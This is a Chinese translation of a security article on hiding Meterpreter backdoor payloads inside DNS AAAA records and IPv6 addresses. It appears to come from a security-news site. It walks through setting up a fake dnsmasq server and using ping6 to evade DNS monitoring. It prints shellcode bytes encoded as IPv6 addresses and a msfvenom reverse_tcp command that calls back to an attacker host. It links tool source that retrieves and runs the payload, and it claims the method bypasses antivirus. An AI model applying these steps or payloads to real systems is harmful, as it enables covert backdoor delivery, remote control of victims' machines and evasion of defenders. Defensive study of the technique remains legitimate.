
# 【技术分享】利用DNS AAAA记录和IPv6地址传输后门


                                阅读量   
                                **154409**
                            
                        |
                        
                                                                                                                                    ![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：peerlyst.com
                                <br>原文地址：[https://www.peerlyst.com/posts/transferring-backdoor-payloads-by-dns-aaaa-records-and-ipv6-address-damon-mohammadbagher](https://www.peerlyst.com/posts/transferring-backdoor-payloads-by-dns-aaaa-records-and-ipv6-address-damon-mohammadbagher)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/85599/t01b5da639b29652502.jpg)](./img/85599/t01b5da639b29652502.jpg)

翻译：[myswsun](http://bobao.360.cn/member/contribute?uid=2775084127)

预估稿费：260RMB（不服你也来投稿啊！）

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿**<br>**

**<br>**

**0x00 前言**

在本文中，我想解释如何在DNS流量中利用IPv6地址（AAAA）记录传输Payload。在我之前的[文章](https://www.peerlyst.com/posts/bypassing-anti-viruses-with-transfer-backdoor-payloads-by-dns-traffic-damon-mohammadbagher)中，我解释了如何利用DNS和PTR记录，现在我们将讨论AAAA记录。

本文分为两部分:

**第一部分**：DNS AAAA记录和ICMPv6

**第二部分**：DNS和AAAA记录（大的DNS AAAA记录响应）



**0x01 DNS AAAA记录和ICMPv6**

IPv6地址对于传输Payload非常有用，让我解释下如何完成这个例子。

举个例子，我们有一个IPv6地址如下：

fe80:1111:0034:abcd:ef00:ab11:ccf1:0000

这个例子中，我们能将xxxx部分用于我们的Payload。

fe80:1111:xxxx:xxxx:xxxx:xxxx:xxxx:wxyz

我认为我们有两种方式将IPv6地址用于我们的Payload，第一个是我们使用DNS和AAAA记录，第二个是使用这些IPv6地址和DNS AAAA记录，也是Ping6的ICMPv6流量。

ICMPv6和Ping6：这个例子中，你能通过虚假的IPv6和注入的Payload来改变攻击者的IPv6地址，然后从后门系统中，你能通过循环Ping6得到这些IPv6地址（ICMPv6流量）。

因此我们有下面这些东西：

（后门系统）ip地址 = {192.168.1.120}

（攻击者系统）ip地址 = {192.168.1.111

,fe80:1111:0034:abcd:ef00:ab11:ccf1:0000}

(攻击者系统)DNS名 = test.domain.com，和安装的DNS服务{dnsmasq或dnsspoof}

DNS AAAA记录和ICMPv6步骤：

步骤1：（攻击者DNS服务器）record0=&gt;

fe80:1111:0034:abcd:ef00:ab11:ccf1:0000 AAAA test.domain.com

步骤2：（后门系统）==&gt;nslookup test.server.com 192.168.1.111

步骤3：（后门系统）循环Ping6=&gt;（攻击者系统fe80:1111:0034:abcd:ef00:ab11:ccf1:0000）

步骤4：（后门系统）通过Ping6响应在IPv6地址中转储出注入的Payload，转储这些部分｛0034:abcd:ef00:ab11:ccf1｝

步骤5：（攻击者DNS服务器）record0改为新的test.domain.com

步骤6：（攻击者DNS服务器）record0=&gt;

fe80:1111:cf89:abff:000e:09b1:33b1:0001 AAAA test.domain.com

步骤6-1：（攻击者系统）通过ifconfig添加或改变NIC IPv6地址{新的IPv6地址：fe80:1111:cf89:abff:000e:09b1:33b1:0001}

步骤6-2：关于步骤3的ping6的响应=超时或不可达（错误），这个时间是获取新的IPv6地址的标志，或者你的流量被某些东西检测到并阻止了。

步骤7：（后门系统）=&gt;nslookup test.server.com 192.168.1.111

步骤8：（后门系统）循环Ping6 test.domain.com=&gt;{新的IPv6地址fe80:1111:cf89:abff:000e:09b1:33b1:0001}

步骤9：（后门系统）通过IPv6的响应，从新的IPv6地址中转储出注入的Payload，转储这些部分｛cf89:abff:000e:09b1:33b1｝

注1：我们何时能知道IPv6地址改变了？当来自攻击者系统的ping6响应是超时或者不可达。你也可以通过nslookup检查。

注2：也可以使用多个IPv6地址为攻击者的NIC，这种情况下不需要步骤6-1。但是这样你不能使用注1。因此这种情况下你应该使用定时器或者循环通过nslookup或类似的工具得到来自攻击者系统的新的IPv6地址。意思是，从后门系统，你能逐行得到攻击者系统的IPv6地址和DNS Round-robin特征以及分组IPv6 DNS域名。

在这些步骤之后，你能通过DNS和ICMPv6流量得到20字节的Payload：

Payload0=fe80:1111:0034:abcd:ef00:ab11:ccf1:0000==&gt;0034:abcd:ef00:ab11:ccf1

Payload1=fe80:1111:cf89:abff:000e:09b1:33b1:0001==&gt;cf89:abff:000e:09b1:33b1

因此我们在两次Ping6之后得到这个Payload：

Reponse：0034abcdef00ab11ccf1cf89abff000e09b133b1

但是在这个技术中，你只能通过DNS流量做到这个，意味着你能移除所有的Ping6步骤。因此，如果你想不使用Ping6和ICMPv6流量就做到这个，你只需要步骤2和7，通过DNS响应从DNS服务器转储payload。但是我们将在第二部分中讨论讨论这个：（DNS和AAAA记录）

让我们展示一些关于ICMPv6方法的图片，没有代码和工具。

我将来可能会发布C#代码，并且也和这个文章一步一步介绍，但是我想展示关于DNS AAAA + ICMPv6技术的所有图片。                                

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01dc62bda09613aa4a.png)

图A

在图A中，你能看到对于test.domain.com，我们有8个的AAAA记录，你也能看到这个IPv6地址的Ping响应，在这个技术中的DNS和ICMPv6，你能通过1或2下载DNS域名，然后如果你想使用ICMPv6，你能Ping6这些IPv6地址。

图A中，我们有8个AAAA记录，因此我们有8*10字节=80字节

```
Meterpreter payload!
fe80:1111:fc48:83e4:f0e8:cc00:0000:ae0 test.domain.com
fe80:1111:4151:4150:5251:5648:31d2:ae1 test.domain.com
fe80:1111:6548:8b52:6048:8b52:1848:ae2 test.domain.com
fe80:1111:8b52:2048:8b72:5048:0fb7:ae3 test.domain.com
fe80:1111:4a4a:4d31:c948:31c0:ac3c:ae4 test.domain.com
fe80:1111:617c:022c:2041:c1c9:0d41:ae5 test.domain.com
fe80:1111:01c1:e2ed:5241:5148:8b52:ae6 test.domain.com
fe80:1111:208b:423c:4801:d066:8178:ae7 test.domain.com
PAYLOAD0= fc4883e4f0e8cc000000 and Counter = ae0
PAYLOAD1= 415141505251564831d2 and Counter = ae1
```

因此我们得到payload=

fc4883e4f0e8cc000000415141505251564831d2

为什么Ping，我们何时通过DNS请求得到payload？

如果你想使用DNS请求，如DNS循环请求或者通过AAAA记录有大的响应的DNS请求，那么这对于·DNS监控工具检测是一种特征。因此如果在每个DNS响应之后对于AAAA记录你有1或2个ping6，那么我认为它是正常的流量，并且能通过DNS监控设备或者DNS监控工具检测的风险很小。

例如你能通过1或2或3个AAAA记录使用一个响应一个请求。意思是如果响应有4个AAAA记录，或者超过4个AAAA记录，那么可能有网络监控设备或工具将检测你的流量，但是在这些网络限制方面，SOC/NOC的家伙比我更有发言权。

正如你能在图A中我的test.domain.com请求在响应中有8个AAAA记录。

因此这种情况，我们应该在IPv6地址中将你的payload分组，DNS名也是一样。

让我解释一些ICMPv6的东西，如果你想通过IPv6地址ping一个系统，首先你应该得到那个系统的IPv6地址，因此你需要DNS请求，总是很重要的点是对于你要转储的所有IPv6地址和从IPv6地址中转储注入的Meterpreter Payload，你需要多少DNS请求？

一个请求？

如果你想通过一个请求和一个响应得到所有的IPv6地址，那么你将在一个DNS响应中包含大量的AAAA记录，因此被检测的风险很高。

看图A1：

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0156ae0cc00e53c310.png)

图A1

并且在图A2，你能看见2个请求的长度，第一个是小响应，第二个是大响应。

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015996f0bec26a80da.png)

图A2-如你所见，我们有两个DNS AAAA响应，第一个长度132（小响应）和第二个长度1503（大响应）

在本文中，我将通过类似图A2中的DNS AAAA记录转储所有的IPv6地址来解释一个请求和一个响应，但是在这种情况下我们知道DNS+ICMPv6也是有被检测的风险的，如在图A2 所见，我们的第二个响应长度很长，将导致被检测的风险。

两个请求或者更多？

如你在图B所见，我的payload在3个DNS名中｛test0.domian.com,test1.domain.com,test2.domain.com｝.

并且我一次ping6一个IPv6地址，且得到了100%的ping回应。

因此在这个例子中，每个响应中我们有包含两个AAAA记录的3个请求和3个响应，在每个DNSAAAA响应之后我们还有ICMPv6流量，最后我们也有一个小长度的DNS响应。

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013cedeb18cb9b9c31.png)

图B

**注意：我的Linux系统有多个IPv6地址，Ping6回复在图C中。**

你能通过ifconfig或者多个IPv6赋给NIC来完成步骤6-1，如图C。

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d755252cde9bf1f7.png)

图C

并且，图C1中是我们的DNS查询：

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d90bf58f8296bce7.png)

图C1

现在你能在图D中看到另一个请求和响应分组的例子。

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01db762612725cca07.png)

图D

如图E所见，对于DNS请求和响应，我们的DNS服务器记录。

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01eb341b2f3b9b05e6.png)

图E

无论如何，图中所见的这种方法技术上是可行的，将来我将完成C#代码。



**<br>**

**0x02 DNS和AAAA记录（大的DNS AAAA记录响应）**

现在，本文中我想讨论DNS和AAAA记录，并讨论如何通过从假的DNS服务器到后门系统的一个DNS请求和DNS响应得到这些payload。因此我们讨论大的AAAA响应，意味着在一个DNS响应之后，你能通过一个DNS AAAA响应，在后门系统上得到所有的payload和Meterpreter会话。

通过NativePayload_IP6DNS工具，使用DNS AAAA记录传输后门payload的步骤：

步骤1：使用hosts文件伪造假的DNS服务器。

这种情况下，对于攻击者系统，我想使用dnsmasq工具和dnsmasq.hosts文件。

在我们伪造文件之前，你需要payload，因此能通过下面的命令得到payload：

Msfvenom–arch x86_64 –platform windows -pwindows/x64/meterpreter/reverse_tcp lhost 192.168.1.50 -f c &gt;/payload.txt

注意：这个例子中的192.168.1.50是攻击者的虚假的dns服务器，和攻击者的Metasploit Listener。

现在你应该通过这个payload字符串伪造hosts文件，如图1，你能使用下面的语法伪造：

语法1: NativePayload_IP6DNS.exe null 0034abcdef00ab11ccf1cf89abff000e09b133b1…

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0136b9eb062edb3414.png)

图1

现在拷贝这些IPv6地址到DNS hosts文件中，如图2，并且你需要在每行IPv6地址后面写入DNS域名。

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011cf32925f48d25e7.png)

图2

这个例子中，我想使用工具dnsmasq作为DNS服务器，因此你能编辑/etc/hosts文件或者/etc/dnsmasq.hosts。

它依赖你的dnsmasq工具的配置。

因此，如图3，你能使用如下命令启动DNS服务器。

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013cd8e31f6297c8a4.png)

图3.

在启动DNS服务器后，你的dnsmasq应该会从hosts文件中至少读取51个地址。

最后用下面的语法，通过一个DNS IPv6 AAAA记录响应，你将得到Meterpreter会话（如图A2中的大的响应，第二个DNS响应，长度为1503）

语法: NativePayload_IP6DNS.exe “FQDN” “Fake DNS Server”

语法: NativePayload_IP6DNS.exe test.domain.com 192.168.1.50

[![](./img/85599/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d6015b937f6bbcec.png)

图4

总而言之，DNS流量的PTR记录和IPv6 AAAA记录对于传输payload并绕过网络监控或者类似的东西非常有用，并且这些技术也能绕过反病毒软件。

NativePayload_IP6DNS.exe的C#源代码：（DNS AAAA记录）

[https://github.com/DamonMohammadbagher/NativePayload_IP6DNS](https://github.com/DamonMohammadbagher/NativePayload_IP6DNS)

NativePayload_DNS.exe tool的C#源代码：（DNS PTR记录）

[https://github.com/DamonMohammadbagher/NativePayload_DNS](https://github.com/DamonMohammadbagher/NativePayload_DNS)
